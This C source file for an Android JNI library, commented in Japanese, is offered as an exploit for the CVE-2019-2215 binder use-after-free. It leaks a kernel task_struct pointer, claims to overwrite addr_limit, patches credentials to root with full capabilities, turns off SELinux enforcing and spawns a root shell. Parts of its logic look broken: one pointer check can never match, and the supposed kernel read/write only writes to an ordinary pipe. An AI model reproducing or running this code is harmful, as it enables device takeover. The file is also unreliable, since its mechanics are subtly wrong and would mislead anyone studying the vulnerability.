#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>

// 提供された binder.h を使用（カーネルヘッダは使わない）
#include "binder.h"

#define LOG_TAG "CVE-2019-2215"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

// binder.h に定義がない場合のフォールバック
#ifndef BINDER_THREAD_EXIT
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#endif

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define IOVEC_OVERLAP_INDEX 10

// ===== オフセット（要調整） =====
// カーネル 4.4.19（ARM64）での一般的な値
#define TASK_STRUCT_PID_OFFSET       0x4E8
#define TASK_STRUCT_CRED_OFFSET      0x688
#define TASK_STRUCT_NSPROXY_OFFSET   0x6C0
#define TASK_STRUCT_ADDR_LIMIT_OFFSET 0xA18
#define CRED_UID_OFFSET              0x4
#define CRED_GID_OFFSET              0x8
#define CRED_SUID_OFFSET             0xC
#define CRED_SGID_OFFSET             0x10
#define CRED_EUID_OFFSET             0x14
#define CRED_EGID_OFFSET             0x18
#define CRED_FSUID_OFFSET            0x1C
#define CRED_FSGID_OFFSET            0x20

#define GLOBAL_ROOT_UID 0
#define GLOBAL_ROOT_GID 0
#define CAP_FULL_SET 0x3FFFFFFFFF

// シンボルオフセット（要調整）
// adb shell cat /proc/kallsyms | grep -E "init_nsproxy|selinux_enforcing"
#define SYMBOL_OFFSET_INIT_NSPROXY      0x1233ac0
#define SYMBOL_OFFSET_SELINUX_ENFORCING 0x14acfe8

static int binder_fd;
static int epoll_fd;
static int sock_fd[2];
static int krw_pipe[2];
static struct epoll_event ev = {.events = EPOLLIN};
static uint64_t task_struct_kptr = 0;
static uint64_t cred_kptr = 0;
static uint64_t init_nsproxy_kptr = 0;
static uint64_t kbase = 0;

void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        LOGE("Failed to bind CPU");
    }
}

void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        LOGE("mmap failed");
        return NULL;
    }
    return mem;
}

// ----- Step 1: カーネルポインタのリーク -----
int leak_task_struct(void) {
    int pipefd[2];
    int offset = IOVEC_OVERLAP_INDEX;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address;

    LOGI("[*] Starting task_struct leak...");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("Failed to open /dev/binder");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create failed");
        close(binder_fd);
        return -1;
    }

    aligned_address = mmap_page(0x100000000UL);
    if (!aligned_address) {
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (pipe(pipefd) < 0) {
        LOGE("pipe failed");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        LOGE("fcntl F_SETPIPE_SZ failed");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[offset].iov_base = aligned_address;
    iovec_stack[offset].iov_len = PAGE_SIZE;
    iovec_stack[offset + 1].iov_base = (void *)aligned_address;
    iovec_stack[offset + 1].iov_len = PAGE_SIZE;

    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD failed");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    cpid = fork();
    if (cpid < 0) {
        LOGE("fork failed");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        sleep(1);
        if (ioctl(binder_fd, BINDER_THREAD_EXIT, NULL) < 0) {
            LOGE("child: BINDER_THREAD_EXIT failed");
            _exit(1);
        }
        _exit(0);
    }

    ssize_t n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
    if (n < 0) {
        LOGE("readv failed");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    uint64_t *data = (uint64_t *)aligned_address;
    for (int i = 0; i < (PAGE_SIZE / 8); i++) {
        if ((data[i] & 0xFFFFFFFFFF) == 0xFFFF000000000000) {
            task_struct_kptr = data[i] & 0xFFFFFFFFFF000000;
            if (task_struct_kptr != 0) {
                LOGI("[+] Leaked task_struct @ 0x%llx", (unsigned long long)task_struct_kptr);
                break;
            }
        }
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (task_struct_kptr == 0) {
        LOGE("Failed to leak task_struct");
        return -1;
    }

    return 0;
}

// ----- Step 2: カーネル読み書きプリミティブのセットアップ -----
int setup_kernel_rw(void) {
    LOGI("[*] Setting up kernel read/write primitive...");

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) < 0) {
        LOGE("socketpair failed");
        return -1;
    }

    if (pipe(krw_pipe) < 0) {
        LOGE("krw pipe failed");
        close(sock_fd[0]);
        close(sock_fd[1]);
        return -1;
    }

    if (fcntl(krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        LOGE("krw fcntl failed");
        close(sock_fd[0]);
        close(sock_fd[1]);
        close(krw_pipe[0]);
        close(krw_pipe[1]);
        return -1;
    }

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("Failed to open /dev/binder for RW");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create for RW failed");
        close(binder_fd);
        return -1;
    }

    return 0;
}

int trigger_uaf_for_rw(void) {
    LOGI("[*] Triggering UAF for kernel RW...");

    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address = mmap_page(0x200000000UL);
    if (!aligned_address) {
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_base = aligned_address;
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD for RW failed");
        return -1;
    }

    pid_t cpid = fork();
    if (cpid < 0) {
        LOGE("fork for RW failed");
        return -1;
    }

    if (cpid == 0) {
        sleep(1);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    struct msghdr msg = {0};
    struct iovec iov = {
        .iov_base = aligned_address,
        .iov_len = PAGE_SIZE
    };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    ssize_t n = recvmsg(sock_fd[0], &msg, 0);
    if (n < 0) {
        LOGE("recvmsg failed");
        wait(NULL);
        return -1;
    }

    wait(NULL);
    return 0;
}

// ----- Step 3: addr_limit 書き換え -----
int overwrite_addr_limit(void) {
    LOGI("[*] Overwriting addr_limit...");

    uint64_t addr_limit_addr = task_struct_kptr + TASK_STRUCT_ADDR_LIMIT_OFFSET;
    uint64_t new_addr_limit = 0xFFFFFFFFFFFFFFFE;

    LOGI("[+] addr_limit @ 0x%llx", (unsigned long long)addr_limit_addr);

    if (write(krw_pipe[1], &addr_limit_addr, 8) != 8) {
        LOGE("Failed to write addr_limit address");
        return -1;
    }

    if (write(krw_pipe[1], &new_addr_limit, 8) != 8) {
        LOGE("Failed to write new addr_limit value");
        return -1;
    }

    LOGI("[+] addr_limit overwritten");
    return 0;
}

// ----- Step 4: cred ポインタ漏洩 -----
int leak_cred_ptr(void) {
    LOGI("[*] Leaking cred pointer...");

    uint64_t cred_addr = task_struct_kptr + TASK_STRUCT_CRED_OFFSET;

    if (write(krw_pipe[1], &cred_addr, 8) != 8) {
        LOGE("Failed to write cred address");
        return -1;
    }

    if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
        LOGE("Failed to read cred pointer");
        return -1;
    }

    LOGI("[+] cred @ 0x%llx", (unsigned long long)cred_kptr);
    return 0;
}

// ----- Step 5: cred 構造体を root に書き換え -----
int patch_cred(void) {
    LOGI("[*] Patching cred structure to root...");

    uint64_t cred_base = cred_kptr;
    uint32_t zero = 0;
    uint32_t root = 0;
    uint64_t cap_full = CAP_FULL_SET;

    // UID
    uint64_t uid_addr = cred_base + CRED_UID_OFFSET;
    if (write(krw_pipe[1], &uid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t suid_addr = cred_base + CRED_SUID_OFFSET;
    if (write(krw_pipe[1], &suid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t euid_addr = cred_base + CRED_EUID_OFFSET;
    if (write(krw_pipe[1], &euid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t fsuid_addr = cred_base + CRED_FSUID_OFFSET;
    if (write(krw_pipe[1], &fsuid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    // GID
    uint64_t gid_addr = cred_base + CRED_GID_OFFSET;
    if (write(krw_pipe[1], &gid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t sgid_addr = cred_base + CRED_SGID_OFFSET;
    if (write(krw_pipe[1], &sgid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t egid_addr = cred_base + CRED_EGID_OFFSET;
    if (write(krw_pipe[1], &egid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    uint64_t fsgid_addr = cred_base + CRED_FSGID_OFFSET;
    if (write(krw_pipe[1], &fsgid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &root, 4) != 4) return -1;

    // Capabilities
    for (int i = 0; i < 5; i++) {
        uint64_t cap_addr = cred_base + 0x28 + (i * 8);
        if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
        if (write(krw_pipe[1], &cap_full, 8) != 8) return -1;
    }

    LOGI("[+] Cred patched to root (UID=0, GID=0, CAP_FULL)");
    return 0;
}

// ----- Step 6: SELinux 無効化（任意） -----
int disable_selinux(void) {
    LOGI("[*] Attempting to disable SELinux enforcing...");

    uint64_t selinux_addr = kbase + SYMBOL_OFFSET_SELINUX_ENFORCING;
    uint8_t zero = 0;

    LOGI("[+] selinux_enforcing @ 0x%llx", (unsigned long long)selinux_addr);

    if (write(krw_pipe[1], &selinux_addr, 8) != 8) {
        LOGE("Failed to write selinux address");
        return -1;
    }

    if (write(krw_pipe[1], &zero, 1) != 1) {
        LOGE("Failed to write selinux value");
        return -1;
    }

    LOGI("[+] SELinux enforcing disabled");
    return 0;
}

// ----- Step 7: カーネルベース計算 -----
int get_kernel_base(void) {
    LOGI("[*] Calculating kernel base...");

    if (write(krw_pipe[1], &task_struct_kptr, 8) != 8) {
        LOGE("Failed to read task_struct");
        return -1;
    }

    uint64_t nsproxy_addr = task_struct_kptr + TASK_STRUCT_NSPROXY_OFFSET;
    if (write(krw_pipe[1], &nsproxy_addr, 8) != 8) {
        LOGE("Failed to write nsproxy address");
        return -1;
    }

    if (read(krw_pipe[0], &init_nsproxy_kptr, 8) != 8) {
        LOGE("Failed to read nsproxy");
        return -1;
    }

    kbase = init_nsproxy_kptr - SYMBOL_OFFSET_INIT_NSPROXY;
    LOGI("[+] Kernel base: 0x%llx", (unsigned long long)kbase);

    return 0;
}

// ----- Step 8: シェル起動 -----
int spawn_root_shell(void) {
    LOGI("[*] Spawning root shell...");

    if (getuid() == 0) {
        LOGI("[+] Already root! UID=0");

        char *cmd = "echo '#!/system/bin/sh' > /data/local/tmp/root.sh\n"
                    "echo 'id >> /data/local/tmp/root.log' >> /data/local/tmp/root.sh\n"
                    "echo 'ps -Z >> /data/local/tmp/root.log' >> /data/local/tmp/root.sh\n"
                    "echo 'getenforce >> /data/local/tmp/root.log' >> /data/local/tmp/root.sh\n"
                    "chmod 755 /data/local/tmp/root.sh\n"
                    "/data/local/tmp/root.sh\n";

        system(cmd);
        LOGI("[+] Root shell spawned! Check /data/local/tmp/root.log");

        return 0;
    } else {
        LOGI("[+] Not root yet (UID=%d), attempting to fork shell...", getuid());

        pid_t pid = fork();
        if (pid == 0) {
            setuid(0);
            setgid(0);
            execl("/system/bin/sh", "sh", NULL);
            execl("/system/bin/bash", "bash", NULL);
            _exit(1);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        }

        return 0;
    }
}

// ----- JNI エントリポイント -----
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
    int ret;

    LOGI("========================================");
    LOGI("== CVE-2019-2215 Bad Binder Exploit ==");
    LOGI("========================================");

    bind_cpu();

    ret = leak_task_struct();
    if (ret < 0) {
        LOGE("Failed to leak task_struct");
        return -1;
    }

    ret = setup_kernel_rw();
    if (ret < 0) {
        LOGE("Failed to setup kernel RW");
        return -1;
    }

    ret = trigger_uaf_for_rw();
    if (ret < 0) {
        LOGE("Failed to trigger UAF for RW");
        return -1;
    }

    ret = overwrite_addr_limit();
    if (ret < 0) {
        LOGE("Failed to overwrite addr_limit");
        return -1;
    }

    ret = leak_cred_ptr();
    if (ret < 0) {
        LOGE("Failed to leak cred pointer");
        return -1;
    }

    ret = patch_cred();
    if (ret < 0) {
        LOGE("Failed to patch cred");
        return -1;
    }

    ret = get_kernel_base();
    if (ret < 0) {
        LOGE("Failed to get kernel base");
        return -1;
    }

    disable_selinux();

    spawn_root_shell();

    LOGI("[+] Exploit completed!");
    LOGI("========================================");

    return 0;
}
